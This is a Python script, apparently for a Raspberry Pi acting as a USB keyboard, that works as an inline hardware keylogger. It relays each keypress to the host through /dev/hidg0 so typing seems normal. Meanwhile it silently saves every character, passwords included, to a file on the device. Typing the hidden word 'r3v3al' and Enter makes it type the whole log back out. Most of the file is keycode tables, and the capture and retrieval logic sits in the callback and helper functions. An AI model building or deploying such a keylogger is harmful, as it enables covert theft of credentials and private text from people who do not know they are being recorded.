#!/usr/bin/env python3
import keyboard
NULL_CHAR = chr(0)
caps_lock = False
modifiers = set()
reveal = ''

def write_report(report):
    with open('/dev/hidg0', 'rb+') as fd:
        fd.write(report.encode())

def edit_modifiers(event):
    if event.event_type == 'down':
        modifiers.add(event.name)
    elif event.event_type == 'up':
        modifiers.remove(event.name)

def print_chars():
    with open('/home/pi/backup_602/save.txt', 'r') as r:
        for line in r:
            for c in line:
                if c in upper_to_lower:
                    write_report(chr(mod_vals['shift']) + NULL_CHAR + chr(val[upper_to_lower[c]]) + NULL_CHAR * 5)
                elif c == '\n':
                    write_report(NULL_CHAR * 2 + chr(val['enter']) + NULL_CHAR * 5)
                elif c == ' ':
                    write_report(NULL_CHAR * 2 + chr(val['space']) + NULL_CHAR * 5)
                else:
                    write_report(NULL_CHAR * 2 + chr(val[c]) + NULL_CHAR * 5)

                write_report(NULL_CHAR * 8)

def add_char(name):
    global reveal
    with open('/home/pi/backup_602/save.txt', 'a') as s:
        s.write(name)
    
    if len(reveal) == 6:
        if name == '\n' and reveal == 'r3v3al':
            print_chars()
        
        reveal = reveal[1:] + name
    else:
        reveal += name


def append_char(name):
    if name in upper_symbols:
        if (modifiers == {'shift'} and not caps_lock) or (not modifiers and caps_lock):
            add_char(upper_symbols[name])
        else:
            add_char(name)
    elif name in special_save:
        add_char(special_save[name])




def hook_callback(event):
    global caps_lock
    if event.name in mod_vals:
        edit_modifiers(event)

    if event.name == 'caps lock' and event.event_type == 'down':
        caps_lock = not caps_lock

    if event.event_type == 'down':
        special = 0
        if modifiers:
            for mod in modifiers:
                special += mod_vals[mod]
        if event.name.isalpha() and caps_lock:
            if 'shift' in modifiers:
                special -= mod_vals['shift']
            elif 'right shift' in modifiers:
                special -= mod_vals['right shift']
            else:
                special += mod_vals['shift']
        if not special:
            write_report(NULL_CHAR * 2 + chr(val[event.name]) + NULL_CHAR * 5)
        else:
            write_report(chr(special) + NULL_CHAR + chr(val[event.name]) + NULL_CHAR * 5)
        write_report(NULL_CHAR * 8)
        append_char(event.name)
            

# Translates the name of the keyboard press into the respective code to send to hidg0
# Name comes from the keyboard module's event.event_name when a keypress is detected.
val = {
    'a' : 0x04,
    'b' : 0x05,
    'c' : 0x06,
    'd' : 0x07,
    'e' : 0x08,
    'f' : 0x09,
    'g' : 0x0A,
    'h' : 0x0B,
    'i' : 0x0C,
    'j' : 0x0D,
    'k' : 0x0E,
    'l' : 0x0F,
    'm' : 0x10,
    'n' : 0x11,
    'o' : 0x12,
    'p' : 0x13,
    'q' : 0x14,
    'r' : 0x15,
    's' : 0x16,
    't' : 0x17,
    'u' : 0x18,
    'v' : 0x19,
    'w' : 0x1A,
    'x' : 0x1B,
    'y' : 0x1C,
    'z' : 0x1D,
    '1' : 0x1E,
    '2' : 0x1F,
    '3' : 0x20,
    '4' : 0x21,
    '5' : 0x22,
    '6' : 0x23,
    '7' : 0x24,
    '8' : 0x25,
    '9' : 0x26,
    '0' : 0x27,
    'enter' : 0x28,
    'esc' : 0x29,
    'backspace' : 0x2A,
    'tab' : 0x2B,
    'space' : 0x2C,
    '−' : 0x2D,
    '=' : 0x2E,
    '[' : 0x2F,
    ']' : 0x30,
    '\\' : 0x31,
    # 0x32 is for Non-American keyboards
    ';' : 0x33,
    '\'' : 0x34,
    '`' : 0x35,
    ',' : 0x36,
    '.' : 0x37,
    '/' : 0x38,
    'caps lock' : 0x39,
    'f1' : 0x3A,
    'f2' : 0x3B,
    'f3' : 0x3C,
    'f4' : 0x3D,
    'f5' : 0x3E,
    'f6' : 0x3F,
    'f7' : 0x40,
    'f8' : 0x41,
    'f9' : 0x42,
    'f10' : 0x43,
    'f11' : 0x44,
    'f12' : 0x45,
    'f13' : 0x46, # Print sceen
    'f14' : 0x47, # Scroll lock
    'f15' : 0x48, # Pause/break
    'help' : 0x49, # double check
    'home' : 0x4A,
    'page up' : 0x4B,
    'delete' : 0x4C,
    'end' : 0x4D,
    'page down' : 0x4E,
    'right' : 0x4F,
    'left' : 0x50,
    'down' : 0x51,
    'up' : 0x52,
    # Irrevevant stuff (Probably won't add)
    # keypad, international keyboards, F13-25, mute, volume, lang
    # Hexadecimal keypad, etc
    # Random keys after this
    'ctrl' : 0xE0,
    'shift' : 0xE1,
    'alt' : 0xE2,
    'gui' : 0xE3,
    'right ctrl' : 0xE4,
    'right shift' : 0xE5,
    'right option' : 0x0E6,
    'right gui' : 0xE7,
}

# Translates modifier keys into their hidg0 counterparts.
# To send 'ctrl' and 'shift' code is 'ctrl' + 'shift'
mod_vals = {
    'ctrl' : 0b00000001,
    'shift' : 0b00000010,
    'alt' : 0b00000100,
    'gui' : 0b00001000,
    'right ctrl' : 0b00010000,
    'right shift' : 0b00100000,
    'right alt' : 0b01000000,
    'right gui' : 0b10000000
}

# Translates symbols into their 'uppercase' variants
# May add letters to here
upper_symbols = {
    'a' : 'A',
    'b' : 'B',
    'c' : 'C',
    'd' : 'D',
    'e' : 'E',
    'f' : 'F',
    'g' : 'G',
    'h' : 'H',
    'i' : 'I',
    'j' : 'J',
    'k' : 'K',
    'l' : 'L',
    'm' : 'M',
    'n' : 'N',
    'o' : 'O',
    'p' : 'P',
    'q' : 'Q',
    'r' : 'R',
    's' : 'S',
    't' : 'T',
    'u' : 'U',
    'v' : 'V',
    'w' : 'W',
    'x' : 'X',
    'y' : 'Y',
    'z' : 'Z',
    '1' : '!',
    '2' : '@',
    '3' : '#',
    '4' : '$',
    '5' : '%',
    '6' : '^',
    '7' : '&',
    '8' : '*',
    '9' : '(',
    '0' : ')',
    '−' : '_',
    '=' : '+',
    '[' : '{',
    ']' : '}',
    '\\' : '|',
    ';' : ':',
    '\'' : '\"',
    ',' : '<',
    '.' : '>',
    '/' : '?',
    '`' : '~',
}

# Translates symbols into their 'lowercase' variant
upper_to_lower = {
    'A' : 'a',
    'B' : 'b',
    'C' : 'c',
    'D' : 'd',
    'E' : 'e',
    'F' : 'f',
    'G' : 'g',
    'H' : 'h',
    'I' : 'i',
    'J' : 'j',
    'K' : 'k',
    'L' : 'l',
    'M' : 'm',
    'N' : 'n',
    'O' : 'o',
    'P' : 'p',
    'Q' : 'q',
    'R' : 'r',
    'S' : 's',
    'T' : 't',
    'U' : 'u',
    'V' : 'v',
    'W' : 'w',
    'X' : 'x',
    'Y' : 'y',
    'Z' : 'z',
    '!' : '1',
    '@' : '2',
    '#' : '3',
    '$' : '4',
    '%' : '5',
    '^' : '6',
    '&' : '7',
    '*' : '8',
    '(' : '9',
    ')' : '0',
    '_' : '−',
    '+' : '=',
    '{' : '[',
    '}' : ']',
    '|' : '\\',
    ':' : ';',
    '\"' : '\'',
    '<' : ',',
    '>' : '.',
    '?' : '/',
    '~' : '`',
}

# Special characters to record
special_save = {
    'space' : ' ',
    'enter' : '\n',
    'tab' : '\n',
}

keyboard.hook(callback=hook_callback)
write_report(chr(0b00000001))
print('About to wait...')
keyboard.wait()

